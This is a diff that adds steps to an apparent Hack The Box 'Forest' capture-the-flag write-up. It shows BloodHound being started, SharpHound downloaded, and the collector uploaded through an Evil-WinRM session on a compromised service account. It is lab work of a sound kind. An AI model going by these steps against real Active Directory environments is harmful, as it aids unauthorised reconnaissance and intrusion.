@@ -100,6 +100,37 @@ User flag was in `svc-alfresco`'s Desktop.
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> more ../Desktop/user.txt
 ```
 
+Started bloodhound
+```bash
+sudo ./bloodhound-cli containers start
+
+[+] Checking the status of Docker and the Compose plugin...
+[+] Starting the BloodHound environment
+[+] Running `docker` to restart containers with docker-compose.yml...
+```
+
+Downloaded and unzipped SharpHound
+```bash
+wget "https://github.com/SpecterOps/SharpHound/releases/download/v2.6.7/SharpHound_v2.6.7_windows_x86.zip"
+
+unzip SharpHound_v2.6.7_windows_x86.zip
+
+Archive:  SharpHound_v2.6.7_windows_x86.zip
+  inflating: SharpHound.exe          
+  inflating: SharpHound.exe.config   
+  inflating: SharpHound.pdb          
+  inflating: SharpHound.ps1          
+```
+
+Uploaded the `.exe` to the machine.
+```powershell
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload sharphound.zip
+                                        
+Info: Uploading /home/wither/CTF/HTB/Forest/files/sharphound.zip to C:\Users\svc-alfresco\Documents\sharphound.zip
+                                        
+Info: Upload successful!
+```
+
 
 
 
@@ -114,4 +145,4 @@ User flag was in `svc-alfresco`'s Desktop.
 ## References
 
 ---
-#forest #htb #easy #windows #netexec #asreproast #hashcat 
+#forest #htb #easy #windows #netexec #asreproast #hashcat #bloodhound #sharphound
